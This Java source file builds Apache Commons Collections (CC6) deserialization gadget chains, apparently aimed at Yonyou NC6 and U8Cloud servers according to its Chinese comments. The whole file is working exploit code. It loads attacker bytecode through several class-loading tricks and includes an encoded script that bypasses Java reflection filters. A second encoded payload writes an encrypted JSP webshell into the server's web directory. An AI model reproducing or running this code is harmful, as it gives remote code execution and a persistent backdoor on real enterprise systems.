package payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.tomcat.util.codec.binary.Base64;

import javax.script.ScriptEngineManager;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections {
    //使用DefiningClassLoader加载字节码,适用于nc6
    public Object CC6_defineClass(String classname) throws Exception {
        HashMap<Object, Object> hashMap = new HashMap<>();
        Class classloader;
        try{
            classloader = Class.forName("org.mozilla.javascript.DefiningClassLoader");
        }catch (Exception e){
            classloader = Class.forName("org.mozilla.classfile.DefiningClassLoader");
        }

        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(classloader),
                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{classname, ClassPool.getDefault().get(classname).toBytecode()}),
                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new ConstantTransformer(1)
        };
        ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{});

        Map lazyMap = LazyMap.decorate(new HashMap(), fakeChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "test");

        hashMap.put(entry, "test");

        setFieldValue(fakeChain,"iTransformers",transformers);
        lazyMap.clear();
        return hashMap;
    }

    // 通过ScriptEngineManager执行js代码,字节码加载适用于u8cloud,nc6建议写文件
    public Object CC6_ScriptEngineManager(String classname) throws Exception {
        //加载字节码
        byte[] bytes = ClassPool.getDefault().get(classname).toBytecode();
        String code = Base64.encodeBase64String(bytes);
        System.out.println(code);
        String payload = "try%20%7B%0A%20%20%20%20load(%22nashorn:mozilla_compat.js%22);%0A%7D%20catch%20(e)%20%7B%0A%7D%0A%0Afunction%20getUnsafe()%20%7B%0A%20%20%20%20var%20theUnsafeMethod%20=%0A%20%20%20%20%20%20%20%20java.lang.Class.forName(%22sun.misc.Unsafe%22).getDeclaredField(%22theUnsafe%22);%0A%20%20%20%20theUnsafeMethod.setAccessible(true);%0A%20%20%20%20return%20theUnsafeMethod.get(null);%0A%7D%0A%0Afunction%20removeClassCache(clazz)%20%7B%0A%20%20%20%20var%20unsafe%20=%20getUnsafe();%0A%20%20%20%20var%20clazzAnonymousClass%20=%20unsafe.defineAnonymousClass(%0A%20%20%20%20%20%20%20%20clazz,%0A%20%20%20%20%20%20%20%20java.lang.Class.forName(%22java.lang.Class%22)%0A%20%20%20%20%20%20%20%20%20%20%20%20.getResourceAsStream(%22Class.class%22)%0A%20%20%20%20%20%20%20%20%20%20%20%20.readAllBytes(),%0A%20%20%20%20%20%20%20%20null%0A%20%20%20%20);%0A%20%20%20%20var%20reflectionDataField%20=%0A%20%20%20%20%20%20%20%20clazzAnonymousClass.getDeclaredField(%22reflectionData%22);%0A%20%20%20%20unsafe.putObject(clazz,%20unsafe.objectFieldOffset(reflectionDataField),%20null);%0A%7D%0A%0Afunction%20bypassReflectionFilter()%20%7B%0A%20%20%20%20var%20reflectionClass;%0A%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20reflectionClass%20=%20java.lang.Class.forName(%0A%20%20%20%20%20%20%20%20%20%20%20%20%22jdk.internal.reflect.Reflection%22%0A%20%20%20%20%20%20%20%20);%0A%20%20%20%20%7D%20catch%20(error)%20%7B%0A%20%20%20%20%20%20%20%20reflectionClass%20=%20java.lang.Class.forName(%22sun.reflect.Reflection%22);%0A%20%20%20%20%7D%0A%20%20%20%20var%20unsafe%20=%20getUnsafe();%0A%20%20%20%20var%20classBuffer%20=%20reflectionClass%0A%20%20%20%20%20%20%20%20.getResourceAsStream(%22Reflection.class%22)%0A%20%20%20%20%20%20%20%20.readAllBytes();%0A%20%20%20%20var%20reflectionAnonymousClass%20=%20unsafe.defineAnonymousClass(%0A%20%20%20%20%20%20%20%20reflectionClass,%0A%20%20%20%20%20%20%20%20classBuffer,%0A%20%20%20%20%20%20%20%20null%0A%20%20%20%20);%0A%20%20%20%20var%20fieldFilterMapField%20=%0A%20%20%20%20%20%20%20%20reflectionAnonymousClass.getDeclaredField(%22fieldFilterMap%22);%0A%20%20%20%20var%20methodFilterMapField%20=%0A%20%20%20%20%20%20%20%20reflectionAnonymousClass.getDeclaredField(%22methodFilterMap%22);%0A%20%20%20%20if%20(%0A%20%20%20%20%20%20%20%20fieldFilterMapField%0A%20%20%20%20%20%20%20%20%20%20%20%20.getType()%0A%20%20%20%20%20%20%20%20%20%20%20%20.isAssignableFrom(java.lang.Class.forName(%22java.util.HashMap%22))%0A%20%20%20%20)%20%7B%0A%20%20%20%20%20%20%20%20unsafe.putObject(%0A%20%20%20%20%20%20%20%20%20%20%20%20reflectionClass,%0A%20%20%20%20%20%20%20%20%20%20%20%20unsafe.staticFieldOffset(fieldFilterMapField),%0A%20%20%20%20%20%20%20%20%20%20%20%20java.lang.Class.forName(%22java.util.HashMap%22)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.getConstructor()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.newInstance()%0A%20%20%20%20%20%20%20%20);%0A%20%20%20%20%7D%0A%20%20%20%20if%20(%0A%20%20%20%20%20%20%20%20methodFilterMapField%0A%20%20%20%20%20%20%20%20%20%20%20%20.getType()%0A%20%20%20%20%20%20%20%20%20%20%20%20.isAssignableFrom(java.lang.Class.forName(%22java.util.HashMap%22))%0A%20%20%20%20)%20%7B%0A%20%20%20%20%20%20%20%20unsafe.putObject(%0A%20%20%20%20%20%20%20%20%20%20%20%20reflectionClass,%0A%20%20%20%20%20%20%20%20%20%20%20%20unsafe.staticFieldOffset(methodFilterMapField),%0A%20%20%20%20%20%20%20%20%20%20%20%20java.lang.Class.forName(%22java.util.HashMap%22)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.getConstructor()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.newInstance()%0A%20%20%20%20%20%20%20%20);%0A%20%20%20%20%7D%0A%20%20%20%20removeClassCache(java.lang.Class.forName(%22java.lang.Class%22));%0A%7D%0A%0Afunction%20setAccessible(accessibleObject)%20%7B%0A%20%20%20%20var%20unsafe%20=%20getUnsafe();%0A%20%20%20%20var%20overrideField%20=%20java.lang.Class.forName(%0A%20%20%20%20%20%20%20%20%22java.lang.reflect.AccessibleObject%22%0A%20%20%20%20).getDeclaredField(%22override%22);%0A%20%20%20%20var%20offset%20=%20unsafe.objectFieldOffset(overrideField);%0A%20%20%20%20unsafe.putBoolean(accessibleObject,%20offset,%20true);%0A%7D%0A%0Afunction%20defineClass(bytes)%20%7B%0A%20%20%20%20var%20clz%20=%20null;%0A%20%20%20%20var%20version%20=%20java.lang.System.getProperty(%22java.version%22);%0A%20%20%20%20var%20unsafe%20=%20getUnsafe();%0A%20%20%20%20var%20classLoader%20=%20new%20java.net.URLClassLoader(%0A%20%20%20%20%20%20%20%20java.lang.reflect.Array.newInstance(%0A%20%20%20%20%20%20%20%20%20%20%20%20java.lang.Class.forName(%22java.net.URL%22),%0A%20%20%20%20%20%20%20%20%20%20%20%200%0A%20%20%20%20%20%20%20%20)%0A%20%20%20%20);%0A%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20if%20(version.split(%22.%22)%5B0%5D%20%3E=%2011)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20bypassReflectionFilter();%0A%20%20%20%20%20%20%20%20%20%20%20%20defineClassMethod%20=%20java.lang.Class.forName(%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22java.lang.ClassLoader%22%0A%20%20%20%20%20%20%20%20%20%20%20%20).getDeclaredMethod(%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22defineClass%22,%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20java.lang.Class.forName(%22%5BB%22),%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20java.lang.Integer.TYPE,%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20java.lang.Integer.TYPE%0A%20%20%20%20%20%20%20%20%20%20%20%20);%0A%20%20%20%20%20%20%20%20%20%20%20%20setAccessible(defineClassMethod);%0A%20%20%20%20%20%20%20%20%20%20%20%20clz%20=%20defineClassMethod.invoke(classLoader,%20bytes,%200,%20bytes.length);%0A%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20protectionDomain%20=%20new%20java.security.ProtectionDomain(%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20new%20java.security.CodeSource(%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20null,%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20java.lang.reflect.Array.newInstance(%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20java.lang.Class.forName(%22java.security.cert.Certificate%22),%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%200%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20),%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20null,%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20classLoader,%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5B%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20);%0A%20%20%20%20%20%20%20%20%20%20%20%20clz%20=%20unsafe.defineClass(%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20null,%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20bytes,%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%200,%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20bytes.length,%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20classLoader,%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20protectionDomain%0A%20%20%20%20%20%20%20%20%20%20%20%20);%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%20catch%20(error)%20%7B%0A%20%20%20%20%20%20%20%20error.printStackTrace();%0A%20%20%20%20%7D%20finally%20%7B%0A%20%20%20%20%20%20%20%20return%20clz;%0A%20%20%20%20%7D%0A%7D%0A%0Afunction%20base64DecodeToByte(str)%20%7B%0A%20%20%20%20var%20bt;%0A%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20bt%20=%20java.lang.Class.forName(%22sun.misc.BASE64Decoder%22).newInstance().decodeBuffer(str);%0A%20%20%20%20%7D%20catch%20(e)%20%7B%0A%20%20%20%20%20%20%20%20bt%20=%20java.lang.Class.forName(%22java.util.Base64%22).newInstance().getDecoder().decode(str);%0A%20%20%20%20%7D%0A%20%20%20%20return%20bt;%0A%7D%0Aclz%20=%20defineClass(base64DecodeToByte(%22" + code + "%22));%0Aclz.newInstance();";

        //写文件
        String payload2 = "var%20path%20=%20%22./webapps/nc_web/%22;%0Avar%20shell%20=%20%22%3C%25@page%20import=%5C%22java.util.*,javax.crypto.*,javax.crypto.spec.*%5C%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c);%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b,0,b.length);%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%5C%22POST%5C%22))%7BString%20k=%5C%22e45e329feb5d925b%5C%22;session.putValue(%5C%22u%5C%22,k);Cipher%20c=Cipher.getInstance(%5C%22AES%5C%22);c.init(2,new%20SecretKeySpec(k.getBytes(),%5C%22AES%5C%22));new%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%7D%25%3E%22;%0Avar%20printwriter%20=%20new%20java.io.PrintWriter(path+%22logox1.jsp%22);%0Aprintwriter.println(shell);%0Aprintwriter.close();";

        HashMap<Object, Object> hashMap = new HashMap<>();
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(ScriptEngineManager.class),
                new InvokerTransformer("newInstance", new Class[]{}, new Object[]{}),
                new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"js"}),
                new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{"eval(decodeURIComponent('" + payload + "'));"}),
                new ConstantTransformer(1),
        };
        ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{});

        Map lazyMap = LazyMap.decorate(new HashMap(), fakeChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "test");
        hashMap.put(entry, "test");

        setFieldValue(fakeChain,"iTransformers",transformers);
        lazyMap.clear();
        return hashMap;
    }
    //TemplatesImpl加载字节码,适用于u8cloud
    public Object CC6_TemplatesImpl(String classname) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(classname);
        clazz.getClassFile().setMajorVersion(50);

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazz.toBytecode()});
        setFieldValue(obj, "_name", "1");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, obj);

        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "test");
        lazyMap.remove(obj);

        setFieldValue(lazyMap,"factory", transformer);
        return expMap;
    }
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
}

